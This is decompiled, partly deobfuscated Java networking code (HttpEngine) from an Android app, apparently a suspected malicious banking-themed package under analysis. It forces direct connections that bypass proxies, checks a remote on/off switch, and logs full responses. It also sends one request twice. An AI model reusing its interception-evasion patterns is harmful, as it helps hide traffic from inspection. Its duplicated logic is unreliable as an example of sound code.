package com.wish.lmbank.http;

import android.text.TextUtils;

import androidx.annotation.NonNull;

import com.google.gson.Gson;
import com.google.gson.JsonSyntaxException;
import com.wish.lmbank.common.URL;
import com.wish.lmbank.utils.HandlerUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import java.io.IOException;
import java.net.Proxy;
import java.net.ProxySelector;
import java.net.SocketAddress;
import java.net.URI;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

import gv00l3ah.mvdt7w.bb7d7pu7;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/http/HttpEngine.class */
public class HttpEngine {
    private static final MediaType MEDIA_JSON = MediaType.parse("application/json; charset=utf-8");
    private final String TAG = "HttpEngine";
    public boolean isUnittest = false;
    ConcurrentHashMap<String, Call> map = new ConcurrentHashMap<>();
    OkHttpClient okHttpClient = new OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).readTimeout(10, TimeUnit.SECONDS).readTimeout(10, TimeUnit.SECONDS).proxy(Proxy.NO_PROXY).proxySelector(new ProxySelector() { // from class: com.wish.lmbank.http.HttpEngine.1

        @Override // java.net.ProxySelector
        public void connectFailed(URI uri, SocketAddress socketAddress, IOException iOException) {
        }


        @Override // java.net.ProxySelector
        public List<Proxy> select(URI uri) {
            return Collections.singletonList(Proxy.NO_PROXY);
        }
    }).build();

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/http/HttpEngine$OnResponseCallback.class */
    public interface OnResponseCallback<T> {
        void onResponse(int i, String str, T t);
    }

    public <R extends HttpResponse> void requestAsyncThread(Request request, Class<R> cls, OnResponseCallback<R> onResponseCallback) {
        this.okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                if (onResponseCallback != null) {
                    boolean z = HttpEngine.this.isUnittest;
//                     String m5998 = bb7d7pu7.m5998("jtT4jtL1gcbej9jrgd_sj_7fhtXlgcbej8rpj_bMjtT4jtL1");
                    String m5998 = "网络请求超时，请检查网络";
                    if (z) {
                        onResponseCallback.onResponse(1, m5998, null);
                    } else {
                        onResponseCallback.onResponse(1, m5998, null);
                    }
                }
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                String string = response.body().string();
                String m5998 = "HttpEngine";
//                 LogUtils.d(m5998, bb7d7pu7.m5998("GwwYHAwaHUkcGwVJVEk") + request.url());
                LogUtils.d(m5998, "request url = " + request.url());
//                 LogUtils.d(m5998, bb7d7pu7.m5998("GwwaGQYHGgxJCwYNEElUSQ") + string);
                LogUtils.d(m5998, "response body = " + string);
                try {
                    HttpResponse httpResponse = (HttpResponse) new Gson().fromJson(string, (Class<?>) cls);
                    if (httpResponse == null) {
                        return;
                    }
                    String str = httpResponse.message;
                    String str2 = str;
                    if (httpResponse.code != 0) {
//                         str2 = str + bb7d7pu7.m5998("MgwbG1Q") + httpResponse.message + bb7d7pu7.m5998("NA");
                        str2 = str + "[err=" + httpResponse.message + "]";
                    }
                    if (onResponseCallback != null) {
                        if (HttpEngine.this.isUnittest) {
                            onResponseCallback.onResponse(httpResponse.code, str2, (R) httpResponse);
                        } else {
                            onResponseCallback.onResponse(httpResponse.code, str2, (R) httpResponse);
                        }
                    }
                } catch (JsonSyntaxException e) {
                    onFailure(call, new IOException(e.getMessage()));
                }
            }
        });
        this.okHttpClient.newCall(request).enqueue(new Callback() { // from class: com.wish.lmbank.http.HttpEngine.2

            @Override // okhttp3.Callback
            public void onFailure(@NonNull Call call, @NonNull IOException iOException) {
                if (onResponseCallback != null) {
                    boolean z = HttpEngine.this.isUnittest;
//                     String m5998 = bb7d7pu7.m5998("jtT4jtL1gcbej9jrgd_sj_7fhtXlgcbej8rpj_bMjtT4jtL1");
                    String m5998 = "网络请求超时，请检查网络";
                    if (z) {
                        onResponseCallback.onResponse(1, m5998, null);
                    } else {
                        onResponseCallback.onResponse(1, m5998, null);
                    }
                }
            }

            @Override // okhttp3.Callback
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                String string = response.body().string();
                String m5998 = "HttpEngine";
//                 LogUtils.d(m5998, bb7d7pu7.m5998("GwwYHAwaHUkcGwVJVEk") + request.url());
                LogUtils.d(m5998, "request url = " + request.url());
//                 LogUtils.d(m5998, bb7d7pu7.m5998("GwwaGQYHGgxJCwYNEElUSQ") + string);
                LogUtils.d(m5998, "response body = " + string);
                try {
                    HttpResponse httpResponse = new Gson().fromJson(string, cls);
                    if (httpResponse == null) {
                        return;
                    }
                    String str = httpResponse.message;
                    String str2 = str;
                    if (httpResponse.code != 0) {
//                         str2 = str + bb7d7pu7.m5998("MgwbG1Q") + httpResponse.message + bb7d7pu7.m5998("NA");
                        str2 = str + "[err=" + httpResponse.message + "]";
                    }
                    if (onResponseCallback != null) {
                        if (HttpEngine.this.isUnittest) {
                            onResponseCallback.onResponse(httpResponse.code, str2, (R) httpResponse);
                        } else {
                            onResponseCallback.onResponse(httpResponse.code, str2, (R) httpResponse);
                        }
                    }
                } catch (JsonSyntaxException e) {
                    onFailure(call, new IOException(e.getMessage()));
                }
            }
        });
    }

    public <R extends HttpResponse> void request(Request request, Class<R> cls, OnResponseCallback<R> onResponseCallback) {
//         if (bb7d7pu7.m5998("Bg8P").equals(SharedPreferencesUtils.getValue(bb7d7pu7.m5998("DgUGCwgFNhoeAB0KAQ"), bb7d7pu7.m5998("Bgc")))) {
        if ("off".equals(SharedPreferencesUtils.getValue("global_switch", "on"))) {
            return;
        }
        if (TextUtils.isEmpty(URL.getHost())) {
//             onResponseCallback.onResponse(-100, bb7d7pu7.m5998("AQYaHUkMBBkdEA"), null);
            onResponseCallback.onResponse(-100, "host empty", null);
            return;
        }
        Call newCall = this.okHttpClient.newCall(request);
        this.map.put(request.url().toString(), newCall);
        newCall.enqueue(new AnonymousClass3(this, request, onResponseCallback, cls));
    }

    /* renamed from: com.wish.lmbank.http.HttpEngine$3  reason: invalid class name */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/http/HttpEngine$3.class */
    static class AnonymousClass3 implements Callback {
        final HttpEngine this$0;
        final OnResponseCallback val$callback;
        final Class val$rClass;
        final Request val$request;

        AnonymousClass3(HttpEngine httpEngine, Request request, OnResponseCallback<?> onResponseCallback, Class<?> cls) {
            this.this$0 = httpEngine;
            this.val$request = request;
            this.val$callback = onResponseCallback;
            this.val$rClass = cls;
        }

        @Override // okhttp3.Callback
        public void onFailure(@NonNull Call call, IOException iOException) {
//             LogUtils.d("HttpEngine", bb7d7pu7.m5998("GwwYHAwaHUkPCAAFHBsMRUlJGwwYHAwaHUkcGwVJVEk") + this.val$request.url() + bb7d7pu7.m5998("SUVJDFM") + iOException.getMessage());
            LogUtils.d("HttpEngine", "request failure,  request url = " + this.val$request.url() + " , e:" + iOException.getMessage());
            if (this.val$callback != null) {
                if (!this.this$0.isUnittest) {
                    this.this$0.post(new Runnable() { // from class: com.wish.lmbank.http.HttpEngine.3.1

                        @Override // java.lang.Runnable
                        public void run() {
                            AnonymousClass3.this.val$callback.onResponse(-100, iOException.getLocalizedMessage(), null);
                        }
                    });
                } else {
                    this.val$callback.onResponse(-100, iOException.getLocalizedMessage(), null);
                }
            }
        }

        @Override // okhttp3.Callback
        public void onResponse(Call call, Response response) throws IOException {
            String string = response.body().string();
            String m5998 = "HttpEngine";
//             LogUtils.d(m5998, bb7d7pu7.m5998("GwwYHAwaHUkcGwVJVEk") + this.val$request.url());
            LogUtils.d(m5998, "request url = " + this.val$request.url());
//             LogUtils.d(m5998, bb7d7pu7.m5998("GwwaGQYHGgxJCwYNEElUSQ") + string);
            LogUtils.d(m5998, "response body = " + string);
            try {
                HttpResponse httpResponse = (HttpResponse) new Gson().fromJson(string, (Class<Object>) this.val$rClass);
                if (httpResponse == null) {
                    return;
                }
                String str = httpResponse.message;
                int i = httpResponse.code;
                if (this.val$callback != null) {
                    if (!this.this$0.isUnittest) {
                        this.this$0.post(new Runnable() { // from class: com.wish.lmbank.http.HttpEngine.3.2

                            @Override // java.lang.Runnable
                            public void run() {
                                AnonymousClass3.this.val$callback.onResponse(httpResponse.code, str, httpResponse);
                            }
                        });
                    } else {
                        this.val$callback.onResponse(httpResponse.code, str, httpResponse);
                    }
                }
            } catch (JsonSyntaxException e) {
                onFailure(call, new IOException(e.getMessage()));
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void post(Runnable runnable) {
        HandlerUtils.getMainThreadHandler().post(runnable);
    }

    public void cancel(String str) {
        ConcurrentHashMap<String, Call> concurrentHashMap = this.map;
        if (concurrentHashMap != null && concurrentHashMap.containsKey(str)) {
            this.map.remove(str).cancel();
        }
    }
}
